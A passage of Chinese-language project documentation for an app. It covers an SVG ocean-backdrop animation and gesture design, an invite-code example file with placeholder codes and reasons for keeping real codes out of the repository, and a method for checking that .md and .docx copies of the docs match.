> **以 `s=p²(3−2p)` 平滑收敛，边界为 `0.70 + 0.045s + layer × (0.10 − 0.015s) + shared + detail`。detail 的幅度从 0.022 降到 0.003，各层相同的 shared 在相邻差值中抵消。因此任一带宽下界为 `0.056 + 0.023s`，上界为 `0.144 − 0.053s`，全程仍在 5%–15% 内。** 展示态峰谷与层间宽度更错落；列表态减少浅色带面积、曲率与动态，不把明显波浪强行带入顶栏。**公式与参数是当前选择，不是唯一方案。**

配套：`oceanGeometry.ts` 用 **24 段三次曲线**、**连续切线**；`OceanBackdrop.tsx` 是**单个 SVG + 四个封闭路径 + 单套品牌**，**逐帧改下边界**；文件头也写明"共享潮汐 + 有界层间差异"。

**环境动画**：**连续推进时间，不按固定周期强制重置。页面隐藏时暂停，返回时不补跑隐藏时段**；减少动态时**停止环境动画**，拖动仍更新曲线，松手直接到目标态。**品牌只读取进度，不读取潮汐时间。**

**手势**：**锁定开始时的列表顶部条件，有 8px 方向阈值，横向滑动和输入框不抢占**。从列表中部开始的向下滚动始终属于列表，**需到顶后重新下拉**。滚轮在收缩态向下滚动正常交给列表。**修正了此前滚轮释放方向以及触摸速度到进度速度的符号**；未修改共用物理函数。触摸中断、横向放弃与 `resize` 会恢复吸附。**展开时内容区 `inert`**，避免键盘焦点进入屏外列表。

### 被替换的旧假设与历史经验（**已知陷阱**）

- 旧文档将**各层独立摆动当成必要条件**，导致难以同时满足厚度与动态。**共享运动允许明显起伏，并不必然让曲线平行。**
- **"振幅只能 1.5–2vh"**、**"唯一办法是拉开层间距离"** 只适用于特定的**独立振幅最坏估计**；**不适用于共享位移在差值中抵消的情况**。
- **固定曲线的纯缩放确实不能改变端点比例，但路径形变可以**；**没有两套路径交叉淡化的必要**。
- **"至少 120 个点才能柔和"不是通用结论。三次曲线可以用更少的段数获得连续切线。**
- **`scaleY`、固定定位、旋转三度、CSS 变量均非产品要求。** 本次保留变量驱动布局，但**替换了独立缩放及旋转**。
- **Tailwind、CSS 作用域、错误滚动引用曾是具体故障**，应看当时产物。**不能将所有静止、平直或卡顿都归因于同一个原因。**
- **仍有价值的检查**：顶部覆盖、曲线裁切、全文是否混入注释、**SVG 显式宽高**、内容是否同步移动、**滚动归属是否读取真实 scroller**。**编译成功不能替代视觉检查。**

## 九、`归档/邀请码-示例.md`

**标题**：邀请码清单 · 格式示例。（约 2 KB，全 65 行；**这是一份进仓库的示例文件**，用来展示真实清单长什么样。）

### 为什么真实清单不进仓库

`.gitignore` 里有这几行：

```
docs/邀请码.md
docs/invite-codes.md
docs/邀请码-*.md
!docs/邀请码-示例.md
```

理由有两条，都很实际：

1. **仓库是开源的。** 一个进了仓库的邀请码，就是一个人人手里的邀请码——读到它的人可以直接注册一个账号；
2. **首批邀请码注册出来的是管理员。** 所有者要求把预留编号区间对应的账号标记为管理员（可以访问所有数据，含被弃置的账本），所以这批凭据的权限比普通邀请码更大。

> 另外，邀请码在数据库里是**明文**（`registration_invites.code`），不像恢复码那样存哈希。**它需要能被人读出来念给家人听，所以这份清单是真正的凭据。凭据不该进版本历史。**

### 生成方式

```bash
# 单个（会预留账号编号）
pnpm invite:create "给妈妈"

# 批量，一个事务（预留编号连续，中途失败则一个码都不留）
pnpm invite:batch 98 --note "首批预留编号（管理员）"

# 把输出存成清单
pnpm invite:batch 98 > docs/邀请码.md
```

### 清单长什么样

```markdown
# 邀请码（98 个，一次性，每个对应一个账号编号）

生成时间：2026/10/10 16:45:12
备注：首批预留编号（管理员）

| # | 邀请码 | 账号编号 | 已使用 |
|---|---|---|---|
| 1 | `ABCD-EFGH-JKMN` | 10000002 | 否 |
| 2 | `PQRS-TUVW-XYZ0` | 10000003 | 否 |
| 3 | `2345-6789-ABCD` | 10000004 | 否 |
```

### 编号区间约定

| 区间 | 用途 |
|---|---|
| `10000000` | 所有者本人 |
| `10000001` | 第二个现有账号 |
| `10000002 – 10000099` | 首批邀请码（注册后为管理员） |
| `10000100` | **跳过**，让两段序列一眼可辨 |
| `10000101` 起 | 之后任何方式生成的邀请码，由服务器依次分配 |

完整说明见 `docs/邀请码.md`（不入库）与 `prisma/schema.prisma` 中 `User.accountNumber` 的注释。
（**实现核对**：`registration_invites.code` 是明文且 `@unique`，与本文档一致；`grantsAdmin` 是**存储字段**，不是按编号区间推断——见 `协作与多账本-设计决定.md` §4.2。）

所以：**改内容** → 改这里的 `.md`；**看阅读版** → 去 `docs/` 找同名 `.docx`；⚠️ **而 `pnpm docs:build` 会重新生成上一层的 `.docx`，覆盖手工改动。**

**2. 为什么它们被移到这里**
所有者的原话：**"新建一个不常用文件夹，把所有现在用不到的文件放进去。"** 而他举的例子是"S8 的设计决定"——而 S8 第 3 轮（冲突）刚刚做完，所以那几份确实不需要天天翻了。
⚠️ **而"刚做完"不等于"不用读"**：**S8 第 4 轮（离线拍照排队）已由所有者取消（2026-10-11）**，所以那条"必读"的时机**不会再到来**；**但只要有人再改离线的新建 / 修改 / 删除（那是明细页与详情页的日常路径），`S8-离线写入-设计决定.md` 仍然是必读的。**

### 入口在哪

**`docs/交接.md`** —— 接手的第一份。**`docs/README.md`** —— 全 16 份文档的清单与用途。

## 6. 核实方法（可复现）

1. **标题存在性**：对 `交接.md` / `_docx_text/交接.md` / `归档/S8-冲突-设计决定.md` / `_docx_text/S8-冲突-设计决定.md` 分别 grep `^#{1,4} `，逐条对照。
2. **正文逐字比对**：两边都做规范化——去掉 `#`、`*`、`` ` ``、`>`、`|`、`-` 与全部空白/`\u200b`/`\u00a0`/BOM——再用 `difflib.SequenceMatcher` 求相似度，并列出长度 > 20 的差异块。
3. **`.docx` 正文抽取**：`python-docx` 按 **XML body 的真实文档顺序**遍历（段落与表格交替），而不是"先所有段落、再把表格贴到末尾"——**后者会把每个表格都算成一次"移动"，把相似度从 99.6% 假摔到 70%**（我第一次就是这么比的，已纠正）。
4. **时间戳交叉验证**：比对 `.md` 的 `LastWriteTime` 与 `.docx` 的 `LastWriteTime`。
5. **生成清单**：读 `tools/build-docs.mjs` 的 `DOCUMENTS` 数组（14 项，含源路径、导出名、封面标题、历史 PDF 名）。
